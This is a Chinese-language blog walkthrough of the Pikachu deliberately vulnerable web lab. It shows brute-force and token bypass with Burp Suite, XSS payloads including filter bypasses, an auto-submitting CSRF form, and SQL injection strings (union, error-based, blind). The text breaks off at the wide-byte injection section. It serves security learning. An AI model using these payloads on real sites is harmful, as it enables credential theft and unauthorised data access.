href="https://blog.csdn.net/m0_62584974/article/details/126322675">MS17-010漏洞复现（带win7虚拟机安装，零基础）_永恒之蓝镜像_墨言ink的博客-CSDN博客</a></p><p>从大佬的博客中学到很多，也对这个漏洞更加了解。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞，虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场全通关思路</title>
      <link href="/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/07/30/Pikachu%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%80%9A%E5%85%B3%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="一、基于表单的暴力破解"><a href="#一、基于表单的暴力破解" class="headerlink" title="一、基于表单的暴力破解"></a>一、基于表单的暴力破解</h3><p>本题打开后为一个简单的登录界面</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139255.png"></p><p>无论是用户名还是密码我们都是无从知晓的，所以需要通过BP来爆破出其各自的值</p><p>先随便输入用户名和密码通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312139452.png"></p><p>然后发送给BP的Intruder(测试器)，利用其中的Clusterbomb(集束炸弹)分别对用户名和密码进行爆破，得到用户名和密码分别为admin&#x2F;123456</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140847.png"></p><p>不过本题也不只这一个用户名和密码。</p><h3 id="二、验证码绕过-on-server"><a href="#二、验证码绕过-on-server" class="headerlink" title="二、验证码绕过(on server)"></a>二、验证码绕过(on server)</h3><p>本题在原本的用户名和密码上多了一个验证码，同样的先用BP进行抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140543.png"></p><p>通过抓包重发，发现只要验证码可以重复使用，即当第一次验证码输对以后，只需要去爆破用户名和密码即可，为方便即默认用户名为admin(也可以选择和第一题一样)，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140211.png"></p><p>得到密码为123456，登录成功</p><h3 id="三、验证码绕过-on-client"><a href="#三、验证码绕过-on-client" class="headerlink" title="三、验证码绕过(on client)"></a>三、验证码绕过(on client)</h3><p>先进行BP抓包，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140290.png"></p><p>由于本题是前端验证，所以即使我们将vcode那一处给删除掉，回显仍然判断为用户名和密码不存在</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140627.png"></p><p>所以接下来只需要去爆破出密码即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140251.png"></p><h3 id="四、token防爆破"><a href="#四、token防爆破" class="headerlink" title="四、token防爆破"></a>四、token防爆破</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312140934.png"></p><p>发现当修改密码再发送时会出现另一种回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141962.png"></p><p>即每个数据包都被添加了token验证机制，尝试使用Intruder(测试器)中的Pitchfork(音叉)</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141334.png"></p><p>然后在选项中进行修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141085.png"></p><p>找到Grep-Extract进行添加</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141742.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141767.png"></p><p>即从 <strong>value:”</strong> 开始到 <strong>“ &#x2F;&gt;\n\n                <label></strong> 结束</p><p>然后再重定向中选择 <strong>总是</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141966.png"></p><p>转到有效载荷，有效负载集为1时即为爆破密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141239.png"></p><p>有效负载集选为2，并在有效载荷类型中选择    Recursive grep(递归搜索) </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141151.png"></p><p>开始攻击</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312141964.png"></p><h2 id="Cross-Site-Scripting-（XSS）"><a href="#Cross-Site-Scripting-（XSS）" class="headerlink" title="Cross-Site Scripting （XSS）"></a>Cross-Site Scripting （XSS）</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>                          1.反射性XSS;<br>                          2.存储型XSS;<br>                          3.DOM型XSS;</p><p>​                        XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>​                        XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>​                        形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>​                        因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>​                         输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>​                         输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p></blockquote><h3 id="二、反射型xss-get"><a href="#二、反射型xss-get" class="headerlink" title="二、反射型xss(get)"></a>二、反射型xss(get)</h3><p>本题有着长度限制，不过可以通过F12进行修改，或者先随便输入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142096.png"></p><p>然后通过上方url中的message构成XSS恶意语句，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142803.png"></p><h3 id="三、反射性xss-post"><a href="#三、反射性xss-post" class="headerlink" title="三、反射性xss(post)"></a>三、反射性xss(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142528.png"></p><p>首先他想让你登录，不过用户名和密码就是暴力破解时得到的，登录成功后，直接在输入框中构造XSS恶意语句</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142921.png"></p><p>或者 输入此构造伪链接 </p><!--<a href=javascript:alert(/我是弹窗/)>别点我没结果</a>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142923.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142497.png"></p><h3 id="四、存储型xss"><a href="#四、存储型xss" class="headerlink" title="四、存储型xss"></a>四、存储型xss</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312142139.png"></p><p>本题直接在留言版上写下XSS恶意语句，然后每次点开后就会出现弹窗</p><p>​          <!--<script>alert('我是弹窗')</script>--></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143961.png"></p><p>千万不要在留言板上写这个</p> <!--<script type="text/javascript" >window.location.href="http://www.baidu.com";</script>--><p>不然后面你每次点开存储型XSS就会自动跳转百度</p><h3 id="五、DOM型xss"><a href="#五、DOM型xss" class="headerlink" title="五、DOM型xss"></a>五、DOM型xss</h3><p>在源码中我们可以找到这个语句</p><p><code>document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;</code></p><p>即我们输入框中的内容就是str，所以我们需要在输入框中输入一个内容，使之达到闭合，以此出现弹窗</p><p>构造语句 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>构造后的语句为 </p><!--<a href=''onclick=alert('我是弹窗')>'>what do you see?</a>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143436.png"></p><p>点击下方蓝体，得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143114.png"></p><h3 id="六、DOM型xss-x"><a href="#六、DOM型xss-x" class="headerlink" title="六、DOM型xss-x"></a>六、DOM型xss-x</h3><p>和第五题一样，在输入框中输入 <strong>‘onclick&#x3D;alert(‘我是弹窗’)&gt;</strong></p><p>然后下面出现的蓝体文字多点几下就出弹窗了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143667.png"></p><h3 id="七、xss之盲打"><a href="#七、xss之盲打" class="headerlink" title="七、xss之盲打"></a>七、xss之盲打</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143034.png"></p><p>有框你不打？</p><!--  <script>alert('我是弹窗')</script>--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312143091.png"></p><p>然后本题有着后台登录地址，登录进去看看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144578.png"></p><p>然后就会被弹了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144537.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144304.png"></p><p>盲打的本意就是我们也不知道这个是否会触发，而当管理员打开后台后自动执行xss出现这个弹窗这说明盲打成功</p><h3 id="八、xss之过滤"><a href="#八、xss之过滤" class="headerlink" title="八、xss之过滤"></a>八、xss之过滤</h3><blockquote><p>xss过滤绕过技巧</p><p>1、改变大小写</p><p>2、关闭标签</p><p>3、使用hex编码绕过</p><p>4、绕过magic_quotes_gpc</p><p>5、利用&lt;&gt;标记注射Html&#x2F;Javascript</p><p>6、利用HTML标签属性值执行XSS</p><p>7、空格&#x2F;回车&#x2F;Tab</p><p>8、对标签属性值进行转码</p><p>9、产生自己的事件</p><p>10、利用CSS跨站剖析<br>这里不做赘述，如果想要了解，可以访问[大佬博客](<a href="https://blog.csdn.net/free_xiaochen/article/details/82289316">XSS篇——XSS过滤绕过技巧_xss &lt;被过滤了怎么构造命令_free_xiaochen的博客-CSDN博客</a>)</p></blockquote><p>本题经过尝试是字母大小写绕过</p><!--<Script>alert('我是弹窗')</Script>--><p>这样修改一下就可以触发弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144494.png"></p><h3 id="九、xss之htmlspecialchars"><a href="#九、xss之htmlspecialchars" class="headerlink" title="九、xss之htmlspecialchars"></a>九、xss之htmlspecialchars</h3><p><strong>htmlspecialchars定义和用法</strong></p><blockquote><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 &quot;</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul><p><strong>提示：</strong>要把特殊的 HTML 实体转换回字符，请使用 <a href="https://www.runoob.com/php/func-string-htmlspecialchars-decode.html">htmlspecialchars_decode()</a> 函数。</p></blockquote><p>所以当我们输入xss恶意语句时，会发现被转换为实体符号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308012136704.png"></p><p>所以我们需要构造如下的语句</p><!--**'οnclick='alert("我是弹窗")'**  or  **'onclick='alert(/htmlspecialchars/)'**--><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144582.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144485.png"></p><h3 id="十、xss之href输出"><a href="#十、xss之href输出" class="headerlink" title="十、xss之href输出"></a>十、xss之href输出</h3><p>本题中如果仍使用正常的xss恶意语句，虽可以得到蓝字回显，但点进去却只是403，经测试无论是双写绕过还是大小写等都不可，这里就可以使用另一种方法，js伪协议绕过</p><p>构造  <!--**javascript:alert("我是弹窗")**--></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144368.png"></p><h3 id="十一、xss之js输出"><a href="#十一、xss之js输出" class="headerlink" title="十一、xss之js输出"></a>十一、xss之js输出</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312144286.png"></p><p>先随便输入，得到回显，然后通过源代码找到这一处位置</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    $ms<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//            alert($ms);</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以得知$ms即是我们在文本框写入的内容， 且此内容在js标签内，所以我们需要闭合一下</p><p>构造  <!--</script><script>alert("我是弹窗")</script>--></p><p>得到弹窗</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145532.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="一、概述-1"><a href="#一、概述-1" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>CSRF(跨站请求伪造)概述</p><p>​                        Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>​      <strong>CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</strong>                    </p><p>​      因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>​                        –对敏感信息的操作增加安全的token；<br>​                        –对敏感信息的操作增加安全的验证码；<br>​                        –对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p></blockquote><h3 id="二、CSRF-get"><a href="#二、CSRF-get" class="headerlink" title="二、CSRF(get)"></a>二、CSRF(get)</h3><p>根据提示，得到了几个用户，我们如概述那般，先登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312145987.png"></p><p>修改vince用户的个人信息并利用BP抓包!<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146599.png"></p><p>发现没有token验证，然后将add修改为chain80</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146030.png"></p><p>然后复制url <strong>&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545453&amp;add&#x3D;chain80&amp;email&#x3D;vince%40pikachu.com&amp;submit&#x3D;submit</strong></p><p>我们再登录kobe用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146037.png"></p><p>修改url，kobe的信息被修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307312146544.png"></p><h3 id="三、CSRF-POST"><a href="#三、CSRF-POST" class="headerlink" title="三、CSRF(POST)"></a>三、CSRF(POST)</h3><p>与上题差不多，不过此题是以post传参，我们先登一个lili用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301456781.png"></p><p>然后利用BP抓包修改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301457290.png"></p><p>因为post无法像get那般，所以我们需要自己创建一个恶意站点，在pikachu文件夹vul&#x2F;csrf&#x2F;csrfpost下创建一个html文件，使被攻击用户点击</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"postsubmit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf_post_edit.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  //这一处因人而异<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sex<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>girl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>phonenum<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>18656565545<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>add<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>US<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lili@pikachu.com<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>postsubmit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们登录vince用户</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301503808.png"></p><p>访问这个html文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301509363.png"></p><h3 id="四、CSRF-Token"><a href="#四、CSRF-Token" class="headerlink" title="四、CSRF(Token)"></a>四、CSRF(Token)</h3><p>由于token回显在每次发送请求都是不一样且完全随机的，且后台会对每次生成的token进行验证， 故我们无法通过伪造URL使被攻击者遭到CSRF攻击，以本人目前能力，无法复现</p><p>由此也可见。token保护是一个很好防御CSRF的方法。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="一、概述-2"><a href="#一、概述-2" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。       </p><p>​                 在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>​                    1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>​                    2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>​                    3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!                    </p></blockquote><h3 id="二、数字型注入-post"><a href="#二、数字型注入-post" class="headerlink" title="二、数字型注入(post)"></a>二、数字型注入(post)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301520325.png"></p><p>数字分别代表的就是CSRF中那六个用户，我们直接抓包拼接sql语句</p><p>因为只是数字型，直接联合查询就好</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301523787.png"></p><h3 id="三、字符型注入（get）"><a href="#三、字符型注入（get）" class="headerlink" title="三、字符型注入（get）"></a>三、字符型注入（get）</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301524891.png"></p><p>我们需要判断是单引号闭合还是双引号闭合，</p><p>当我们输入双引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301526744.png"></p><p>当我们输入单引号时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301527016.png"></p><p>构造语句      <strong>1’ union select username,password from pikachu.users#</strong></p><p>得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301528761.png"></p><h3 id="四、搜索型注入"><a href="#四、搜索型注入" class="headerlink" title="四、搜索型注入"></a>四、搜索型注入</h3><p>本次注入，就是你还需要去判断一下有几个列</p><p>当我们判断它有三个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301530849.png"></p><p>判断它有四个列时</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301531100.png"></p><p>所以本题有三个列，则 在第三题的基础上再加修改</p><p>构造语句  <strong>1’ union select username,password,3 from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301532817.png"></p><h3 id="五、xx型注入"><a href="#五、xx型注入" class="headerlink" title="五、xx型注入"></a>五、xx型注入</h3><p>根据提示，这题就是不管他是什么型，使你所写的sql语句能闭合上，</p><p>即构造 <strong>1’) union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301544492.png"></p><h3 id="六、”insert-x2F-update”注入"><a href="#六、”insert-x2F-update”注入" class="headerlink" title="六、”insert&#x2F;update”注入"></a>六、”insert&#x2F;update”注入</h3><p>我们需要先注册一个账号</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301545889.png"></p><p>而根据本题题目 insert和update其实都是sql语句的一种，前者用于添加，后者用于修改</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301547592.png"></p><p>然后构造语句进行报错注入，此时不能再在语句后加入注释符</p><p><strong>know5’ or updatexml(1,concat(0x7e,database()),0) or ‘</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301553046.png"></p><p>修改个人信息也是如此</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301554840.png"></p><h3 id="七、”delete注入”"><a href="#七、”delete注入”" class="headerlink" title="七、”delete注入”"></a>七、”delete注入”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301555856.png"></p><p>点击删除后抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301556185.png"></p><p>由于本题编码问题，所以我们需要用+替换空格，与上题一样，利用报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301559576.png"></p><h3 id="八、http头注入"><a href="#八、http头注入" class="headerlink" title="八、http头注入"></a>八、http头注入</h3><p>即http头的某个值带入sql语句使其注入</p><p>进行BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301628554.png"></p><p>单引号出现报错，所以构造报错注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301629597.png"></p><h3 id="九、布尔盲注"><a href="#九、布尔盲注" class="headerlink" title="九、布尔盲注"></a>九、布尔盲注</h3><p>利用substr构造语句，结合我们在刚才注入时已知的那几个用户，可以通过此语句查询到他们的信息</p><p>lili’ and ascii(substr(database(),1,1))&#x3D;112#</p><p>意思就是判断数据库名称的第一个字符是否等于小写字母<code>p</code>，如果相等，则返回True（即条件成立），否则返回False（即条件不成立）。。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301636136.png"></p><h3 id="十、时间盲注"><a href="#十、时间盲注" class="headerlink" title="十、时间盲注"></a>十、时间盲注</h3><p>时间盲注一般通过if语句，通过延迟的信息进行判断</p><p><strong>1’ and if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)#</strong> 即<code>substr(database(), 1, 1)</code> 是函数 <code>database()</code> 截取第一个字符   **if(substr(database(),1,1)&#x3D;’p’,sleep(5),null)# ** 如果第一个字符是 ‘p’，则执行 <code>sleep(5)</code> 延迟5秒；反之则返回null</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648294.png"></p><p><strong>lili’ and if ((substr(database(),1,1))&#x3D;’p’,sleep&#x3D;(5),null)#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301648804.png"></p><h3 id="十一、宽字节注入"><a href="#十一、宽字节注入" class="headerlink" title="十一、宽字节注入"></a>十一、宽字节注入</h3><p>使用BP抓包</p><p>由于魔术引号的存在，需要在其前面加一个%df</p><p>即构造如下语句 